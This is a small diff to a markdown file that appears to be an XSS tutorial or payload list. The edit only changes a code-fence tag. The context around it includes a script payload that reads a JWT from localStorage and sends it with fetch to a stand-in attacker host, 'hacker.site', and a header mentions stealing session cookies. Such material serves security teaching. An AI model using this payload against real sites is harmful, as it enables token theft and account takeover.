@@ -123,7 +123,7 @@ This script steals the user's cookies, including session cookies, and sends them
 
 - **Stealing JWT Tokens:**
 
-```auto
+```
 <script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
 ```
 
